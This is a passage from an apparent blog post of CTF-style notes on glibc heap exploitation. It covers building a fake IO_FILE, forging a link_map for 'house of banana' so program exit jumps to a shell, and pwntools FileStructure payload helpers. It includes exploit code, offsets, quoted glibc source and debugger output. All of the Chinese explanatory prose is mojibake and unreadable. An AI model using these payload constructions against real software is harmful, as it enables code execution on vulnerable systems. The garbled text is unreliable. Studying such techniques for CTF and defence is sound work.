_chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)                 <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)               <span class="comment"># _wide_data, rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                               <span class="comment"># mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)          <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)               <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure>

<h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><p>ä¸æ˜¯ä¸€ç§æ”»å‡»IO_FILEçš„åˆ©ç”¨æ‰‹æ®µã€‚ç¨‹åºé€šè¿‡exité€€å‡ºæ—¶ï¼Œä¼šè°ƒç”¨ä¸€ä¸ªåå« <code>rtld_global</code> çš„ç»“æ„ä½“ä¸­çš„ä¸€ç³»åˆ—å‡½æ•°æ¥è¿›è¡Œè¯¸å¦‚æ¢å¤å¯„å­˜å™¨ï¼Œæ¸…é™¤ç¼“å†²åŒºç­‰æ“ä½œã€‚</p>
<ul>
<li>å¯ä»¥ä»»æ„åœ°å€å†™ä¸€ä¸ªå †åœ°å€ï¼ˆé€šå¸¸ä½¿ç”¨Â <code>large bin attack</code>ï¼‰</li>
<li>èƒ½å¤Ÿä»Â <code>main</code>Â å‡½æ•°è¿”å›æˆ–è€…è°ƒç”¨Â <code>exit</code>Â å‡½æ•°</li>
<li>å¯ä»¥æ³„éœ²Â <code>libc</code>Â åœ°å€å’Œå †åœ°å€</li>
</ul>
<p>gdb å¸¸ç”¨çš„æŒ‡ä»¤</p>
<ul>
<li>è¿™æ˜¯ld.so æ–‡ä»¶ä¸­çš„ä¸€ä¸ªåœ°å€ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨libc.symè·å¾—åœ°å€</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line">p &amp;_rtld_global</span><br></pre></td></tr></table></figure>


<p><code>rtld_global</code>Â ç»“æ„ä½“é‡Œé¢è£…æœ‰Â <code>_dl_ns</code>Â ç»“æ„ä½“ï¼Œé€šè¿‡æ­£å¸¸ main å‡½æ•°è¿”å›æˆ–è€…è°ƒç”¨ exit é€€å‡ºï¼Œè§¦å‘å‡½æ•°è°ƒç”¨é“¾ï¼š<code>exit()-&gt;_dl_call_fini-&gt;(fini_t)array[i]</code>ã€‚</p>
<ul>
<li>glibc 2.37 åçš„æºç ï¼Œå¯¹æ¯”ä¹‹å‰çš„ä¸é‚£å—ï¼Œå‘ç°ä¸»è¦çš„å˜åŒ–ä¸º <code>_dl_call_fini(l);</code>ï¼Œè·Ÿè¿›å‡½æ•°å‘ç°é™¤äº†è¾“å‡ºdebuggingä¿¡æ¯å‡½æ•°å˜äº†ï¼Œå…¶ä½™éƒ½æ²¡å˜</li>
<li>link map ä½¿ç”¨åŒå‘é“¾è¡¨è¿æ¥èµ·æ¥</li>
<li>nmaps æ˜¯ <code>maps[]</code> ä¸­å…ƒç´ ä¸ªæ•°ï¼Œä¹Ÿå°±æ˜¯ <code>GL(dl_ns)[ns]._ns_loaded</code></li>
<li>å»ºè®®è‡ªå·±éšä¾¿å†™ä¸ªç¨‹åºï¼Œå°†å…¶ä¸­å˜é‡æ‰“å°å‡ºæ¥çœ‹çœ‹ã€‚è¿™é‡ŒåŠ è½½ä¸‹é¢çš„æ³¨é‡Šé‡Œ</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// pwndbg&gt; p _rtld_global </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _dl_fini(<span class="type">void</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_nns  =&gt;  1</span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = <span class="built_in">GL</span>(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">    __rtld_lock_lock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_nloaded  =&gt; 4</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nloaded = <span class="built_in">GL</span>(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">       auditing DSOs.  */</span></span><br><span class="line">    <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">        || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    )</span><br><span class="line">      __rtld_lock_unlock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      _dl_audit_activity_nsid(ns, LA_ACT_DELETE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">         copy the pointers in.  */</span></span><br><span class="line">	  <span class="comment">// nloaded =&gt; 4</span></span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">link_map</span> *maps[nloaded];</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">link_map</span> *l;</span><br><span class="line">      <span class="built_in">assert</span>(nloaded != <span class="number">0</span> || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">// ns=0    pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded</span></span><br><span class="line">	  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_next.l_next.l_next.l_next  ç›´åˆ°å‡ºç°0</span></span><br><span class="line">      <span class="keyword">for</span> (l = <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">        <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">        <span class="comment">// pwndbg p _rtld_global._dl_ns[0]._ns_loaded.l_real</span></span><br><span class="line">        <span class="comment">// éœ€è¦è¿›å…¥è¿™ä¸ªifçº¿</span></span><br><span class="line">        <span class="keyword">if</span> (l == l-&gt;l_real) &#123;</span><br><span class="line">          <span class="built_in">assert</span>(i &lt; nloaded);   <span class="comment">// æ‰€ä»¥è¯´ä¸ä¼šè¶…è¿‡4ä¸ª</span></span><br><span class="line"></span><br><span class="line">          maps[i] = l;</span><br><span class="line">          l-&gt;l_idx = i;</span><br><span class="line">          ++i;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">             are not dlclose()ed from underneath us.  */</span></span><br><span class="line">          ++l-&gt;l_direct_opencount;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">assert</span>(ns != LM_ID_BASE || i == nloaded);  <span class="comment">// è¿‡å…¶ä¸­ä¸€ä¸ªæ£€æŸ¥ï¼Œi==nloaded,ä¹Ÿå°±æ˜¯å…¨éƒ¨çš„ifçº¿éƒ½è¦è¿›å…¥ã€‚</span></span><br><span class="line">      <span class="built_in">assert</span>(ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">      <span class="comment">// nmaps = 4</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">         binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">         the main namespace.  */</span></span><br><span class="line">      _dl_sort_maps(maps, nmaps, (ns == LM_ID_BASE), <span class="literal">true</span>); </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">         from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">         various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">         count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">         we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">         from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">         lock.  */</span></span><br><span class="line">      __rtld_lock_unlock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">         call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">         the front.  */</span></span><br><span class="line">	  <span class="comment">// nmaps = 4</span></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];   <span class="comment">// _ns_loaded</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_init_called) &#123;</span><br><span class="line">          _dl_call_fini(l);            <span class="comment">// è¿›å…¥è¿™ä¸ªå‡½æ•°</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">          <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">          _dl_audit_objclose(l);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">        --l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      _dl_audit_activity_nsid(ns, LA_ACT_CONSISTENT);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (!do_audit &amp;&amp; <span class="built_in">GLRO</span>(dl_naudit) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    do_audit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> again;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))</span><br><span class="line">    _dl_debug_printf(</span><br><span class="line">        <span class="string">&quot;\nruntime linker statistics:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;           final number of relocations: %lu\n&quot;</span></span><br><span class="line">        <span class="string">&quot;final number of relocations from cache: %lu\n&quot;</span>,</span><br><span class="line">        <span class="built_in">GL</span>(dl_num_relocations), <span class="built_in">GL</span>(dl_num_cache_relocations));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>èµ°åˆ° <code>_dl_call_fini</code></p>
<ul>
<li>å­˜åœ¨ä¸€ä¸ªå‡½æ•°è°ƒç”¨ <code>((fini_t)array[sz])()</code>ï¼Œmapä¸ºå‚æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„ <code>GL(dl_ns)[ns]._ns_loaded</code> å’Œå…¶ nextï¼Œnext-&gt;nextâ€¦</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> _dl_call_fini(<span class="type">void</span> *closure_map) &#123;</span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded å’Œ l_next æŒ‡é’ˆ</span></span><br><span class="line">  <span class="comment">// pwndbg p *(struct link_map *) ä¸Šä¸€ä¸ªæŒ‡ä»¤åœ°å€</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">link_map</span> *map = closure_map;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">    _dl_debug_printf(<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, map-&gt;l_name, map-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  map-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26]</span></span><br><span class="line">  <span class="built_in">ElfW</span>(Dyn) *fini_array = map-&gt;l_info[DT_FINI_ARRAY];</span><br><span class="line">  <span class="keyword">if</span> (fini_array != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_addr</span></span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26].d_un.d_val</span></span><br><span class="line">    <span class="built_in">ElfW</span>(Addr) *array = (<span class="built_in">ElfW</span>(Addr) *)(map-&gt;l_addr + fini_array-&gt;d_un.d_ptr);</span><br><span class="line">    <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[28].d_un.d_val / 8</span></span><br><span class="line">    <span class="type">size_t</span> sz = (map-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="built_in">sizeof</span>(<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">	<span class="comment">// ä¸ç®¡ä»€ä¹ˆç±»å‹ï¼Œæœ€åè°ƒç”¨çš„å‡½æ•°åœ°å€å¯ä»¥å¾—åˆ°</span></span><br><span class="line">    <span class="keyword">while</span> (sz-- &gt; <span class="number">0</span>) ((<span class="type">fini_t</span>)array[sz])();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">  <span class="built_in">ElfW</span>(Dyn) *fini = map-&gt;l_info[DT_FINI];</span><br><span class="line">  <span class="keyword">if</span> (fini != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="built_in">DL_CALL_DT_FINI</span>(map, ((<span class="type">void</span> *)map-&gt;l_addr + fini-&gt;d_un.d_ptr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æ˜¯å‡½æ•°è°ƒç”¨èƒ½æ”»å‡»ä¸€ä¸‹å°±è¡Œï¼Œä¸ºäº†æ›´å®¹æ˜“çš„é€šè¿‡ifçš„æ¡ä»¶çš„ï¼Œæˆ‘ä»¬ä¸€èˆ¬æ›¿æ¢é“¾è¡¨æœ€åä¸€ä¸ª link_mapï¼Œä¹Ÿå°±æ˜¯æ‰“ç¬¬3ä¸ªlinkmap<code>ns_loaded.l_next.l_next.l_netx</code></p>
<ul>
<li>è¿™æ˜¯éƒ¨åˆ†çš„å†…å®¹ï¼Œåªæˆªå–äº†æˆ‘ä»¬éœ€è¦çš„å†…å®¹</li>
<li>ä¼ªé€ l_addr, fini_array-&gt;d_un.d_ptr å†…å®¹</li>
<li>DT_FINI_ARRAY ä¸º 26ï¼ŒDT_FINI_ARRAYSZ ä¸º 28</li>
<li>å› ä¸ºæºç å¯èƒ½æ¯”è¾ƒæŠ½è±¡ï¼Œä¸å¦‚ç›´æ¥æ‰“å°å‡ºæ¥ï¼Œè¿™é‡Œåªæˆªå–æœ‰ç”¨çš„éƒ¨åˆ†</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p **(struct link_map **) 0x7ffff7fbb188</span><br><span class="line"><span class="variable">$5</span> = &#123;</span><br><span class="line">  l_addr = 140737349943296,</span><br><span class="line">  l_name = 0x7ffff7fbb660 <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,</span><br><span class="line">  l_ld = 0x7ffff7e18bc0,</span><br><span class="line">  l_next = 0x7ffff7fbbb90,</span><br><span class="line">  l_prev = 0x7ffff7fbb170,</span><br><span class="line">  l_real = 0x7ffff7fbb680,</span><br><span class="line">  l_ns = 0,</span><br><span class="line">  l_libname = 0x7ffff7fbbb10,</span><br><span class="line">  l_info = &#123;0x0, 0x7ffff7e18bc0, 0x7ffff7e18c70, 0x7ffff7e18c60, 0x7ffff7e18c00, 0x7ffff7e18c20, 0x7ffff7e18c30, 0x7ffff7e18ca0, 0x7ffff7e18cb0, 0x7ffff7e18cc0, 0x7ffff7e18c40, 0x7ffff7e18c50, 0x0, 0x0, 0x7ffff7e18bd0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18c80, 0x0, 0x0, 0x7ffff7e18c90, 0x0, 0x7ffff7e18be0, 0x0, 0x7ffff7e18bf0, 0x0, 0x0, 0x7ffff7e18cf0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d10, 0x7ffff7e18d00, 0x7ffff7e18ce0, 0x7ffff7e18cd0, 0x0, 0x0, 0x7ffff7e18d30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d20, 0x0 &lt;repeats 25 <span class="built_in">times</span>&gt;, 0x7ffff7e18c10&#125;,</span><br><span class="line"></span><br><span class="line">pwndbg&gt; ptype ((struct link_map **) <span class="number">0</span>x7ffff7fbb188 )-&gt;l_info</span><br><span class="line">	type = struct &#123;</span><br><span class="line">	    Elf64_Sxword d_tag;</span><br><span class="line">	    union &#123;</span><br><span class="line">	        Elf64_Xword d_val;</span><br><span class="line">	        Elf64_Addr d_ptr;</span><br><span class="line">	    &#125; d_un;</span><br><span class="line">	&#125; *[<span class="number">77</span>]</span><br></pre></td></tr></table></figure>


<p>ä¼ªé€ ï¼Œå †åœ°å€ A</p>
<ul>
<li>l &#x3D; l-&gt;real &#x3D;&gt; A + 0x28 å†…å®¹æ”¾ç€å †åœ°å€ <code>0x28 = distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_real</code></li>
<li>l-&gt;l_init_called ä¸ä¸º0ï¼Œæ•°å­—éšæ„ï¼Œæ ¹æ®ç‰ˆæœ¬è€Œå¼‚ã€‚ <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_init_called</code>ã€‚æˆ‘æµ‹çš„æ˜¯0x312</li>
<li><code>map.l_info[26]</code> ä¸ä¸º 0, <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_info[26]</code></li>
<li><code>map.l_info[28]</code> + 8 æ§åˆ¶å¾ªç¯æ¬¡æ•°ï¼Œä¸€èˆ¬å†™æˆ1å°±è¡Œ</li>
<li>æ§åˆ¶å‡½æ•°æ‰§è¡Œæµ <code>map-&gt;l_addr + fini_array-&gt;d_un.d_ptr</code>ã€‚ä¹Ÿå°±æ˜¯ <code>map-&gt;l_addr + map-&gt;l_info[26]-&gt;d_un.d_ptr</code></li>
<li>fini_array <code>map.l_info[26]</code>åç§»æ˜¯0x110ã€‚é‚£ä¹ˆ28æ˜¯0x120</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// l = l-&gt;real</span></span><br><span class="line">fake+<span class="number">0x28</span> = fake</span><br><span class="line"><span class="comment">// l-&gt;l_init_calledï¼Œä½†æ˜¯æµ‹è¯•åæ˜¯ä¸€ä¸ªmagic numï¼Œéœ€è¦å°†å…¶ä½™ç»“æ„ä½“çš„linkmap çš„ l_init_called æ‰“å°å‡ºæ¥èµ‹å€¼</span></span><br><span class="line">fake+<span class="number">0x312</span> = <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨æ„ï¼Œéœ€è¦è®¾ç½® l_next ä½ç½®ä¸º0æ‰è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸‹é¢çš„å°±æ¯”è¾ƒå›ºå®šäº†</span></span><br><span class="line"><span class="comment">// map.l_info[26]</span></span><br><span class="line">fake+<span class="number">0x110</span> = fake+<span class="number">0x40</span></span><br><span class="line"><span class="comment">// 0x48 æ˜¯ d_un ç»“æ„ä½“æŒ‡é’ˆ</span></span><br><span class="line">fake+<span class="number">0x48</span> = fake+<span class="number">0x58</span></span><br><span class="line"><span class="comment">// åé¢åŠ çš„é‚£ä¸ªä¸œè¥¿</span></span><br><span class="line">fake+<span class="number">0x58</span> = shell    <span class="comment">// 0 + shell æ‰§è¡Œshell</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// map.l_info[28]ã€‚ç”±ä¸Šå¯çŸ¥ï¼Œä¸º0ï¼ŒåŒæ—¶ä¸º 26 çš„ d_tag æˆå‘˜</span></span><br><span class="line">fake+<span class="number">0x120</span> = fake+<span class="number">0x48</span></span><br><span class="line"><span class="comment">// l_info[28] çš„ d_un æŒ‡é’ˆã€‚ sz=1</span></span><br><span class="line">fake+<span class="number">0x50</span> = <span class="number">8</span></span><br></pre></td></tr></table></figure>

<h2 id="pwntools-filepointer"><a href="#pwntools-filepointer" class="headerlink" title="pwntools filepointer"></a>pwntools filepointer</h2><p>å…¶å®çœ‹pwntoolsæ–‡æ¡£å¯ä»¥çœ‹å‡ºå…¶ä¸­å¯¹ <code>IO_FILE</code> ä¹Ÿå­˜åœ¨å¾ˆå¤šå¯ä»¥åˆ©ç”¨çš„ç‚¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib.filepointer <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>

<ol>
<li>IO_FILE ç»“æ„ä½“</li>
</ol>
<ul>
<li><code>_wide_data</code> å°±æ˜¯æˆ‘ä»¬ç°åœ¨å¸¸åˆ©ç”¨çš„ç‚¹ã€‚</li>
<li>æ”¹å˜æˆå‘˜ä¹Ÿåªæ˜¯éœ€è¦ <code>fs.flags = 0x123</code> ç›´æ¥èµ‹å€¼</li>
<li>ä¸¤ä¸ª unknown å˜é‡å¡«å……ç»“æ„ä½“</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FileStructure(null=<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>FileStructure()</span><br><span class="line">&#123; flags: <span class="number">0x0</span></span><br><span class="line"> _IO_read_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_read_end: <span class="number">0x0</span></span><br><span class="line"> _IO_read_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_write_end: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_base: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_end: <span class="number">0x0</span></span><br><span class="line"> _IO_save_base: <span class="number">0x0</span></span><br><span class="line"> _IO_backup_base: <span class="number">0x0</span></span><br><span class="line"> _IO_save_end: <span class="number">0x0</span></span><br><span class="line"> markers: <span class="number">0x0</span></span><br><span class="line"> chain: <span class="number">0x0</span></span><br><span class="line"> fileno: <span class="number">0x0</span></span><br><span class="line"> _flags2: <span class="number">0x0</span></span><br><span class="line"> _old_offset: <span class="number">0xffffffff</span></span><br><span class="line"> _cur_column: <span class="number">0x0</span></span><br><span class="line"> _vtable_offset: <span class="number">0x0</span></span><br><span class="line"> _shortbuf: <span class="number">0x0</span></span><br><span class="line"> unknown1: <span class="number">0x0</span></span><br><span class="line"> _lock: <span class="number">0x0</span></span><br><span class="line"> _offset: <span class="number">0xffffffffffffffff</span></span><br><span class="line"> _codecvt: <span class="number">0x0</span></span><br><span class="line"> _wide_data: <span class="number">0x0</span></span><br><span class="line"> unknown2: <span class="number">0x0</span></span><br><span class="line"> vtable: <span class="number">0x0</span>&#125;</span><br></pre></td></tr></table></figure>


<ol start="2">
<li>house of orange</li>
</ol>
<ul>
<li>io_list_all åœ°å€</li>
<li>ä¼ªé€ çš„ vtable åœ°å€</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>fileStr = FileStructure(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fileStr.orange(io_list_all=<span class="number">0xfacef00d</span>, vtable=<span class="number">0xcafebabe</span>)</span><br></pre></td></tr></table></figure>


<ol start="3">
<li>stdout leak</li>
</ol>
<ul>
<li>ä» addr æ³„éœ² size å¤§å°çš„æ•°æ®</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fileStr = FileStructure(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fileStr.write(addr=<span class="number">0xcafebabe</span>, size=<span class="number">100</span>)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>packingï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦ä¼ªé€ fileç»“æ„ä½“ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‡½æ•°</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ ¹æ® context.archæ‰“åŒ…ï¼Œ ç±»ä¼¼ p32ï¼Œp64 å‡½æ•°</span></span><br><span class="line">flat([</span><br><span class="line">	  con1,</span><br><span class="line">	  con2</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset: con, ç±»ä¼¼äº cyclic(offset) + p64(con)</span></span><br><span class="line">flat(&#123;</span><br><span class="line">	<span class="number">0xe0</span>: <span class="number">100</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›¸å¯¹åç§»</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flat(&#123;<span class="number">0xe0</span>:&#123;<span class="number">0x0</span>: <span class="number">100</span>, <span class="number">0x10</span>: <span class="number">200</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒæ—¶å¯ä»¥æŒ‡å®šå¡«å……å†…å®¹ å’Œ æ€»é•¿åº¦ï¼Œå› ä¸ºæˆ‘ä»¬ä¼ªé€ ç»“æ„ä½“éœ€è¦æ»¡è¶³ä¸€å®šæ¡ä»¶</span></span><br><span class="line">flat(&#123;<span class="number">0xe0</span>:<span class="number">0x100</span>&#125;, filler=<span class="string">b&quot;\x00&quot;</span>, length=<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨æ³•å’Œflat(&#123;&#125;) ä¸€æ · å®˜æ–¹æ–‡æ¡£æ˜¯ alias of flat</span></span><br><span class="line">fit(&#123;&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>æœ€å¥½æ‰‹åŠ¨è°ƒè¯•ä¸€ä¸‹ largebin attack å’Œ house_of_bananaã€‚</p>
<h3 id="house-of-banana-1"><a href="#house-of-banana-1" class="headerlink" title="house of banana"></a>house of banana</h3><p>å‚è€ƒä¸€ä¸‹ <a href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">house_of_bananaæºç åˆ†æ</a>è¿™ä¸€ç¯‡æ–‡ç« çš„demo</p>
<ul>
<li>æ³¨æ„æ”¹rtldç›¸å…³æŒ‡é’ˆå’Œlibcçš„åç§»å¤§å°</li>
</ul>
<p>makefile</p>
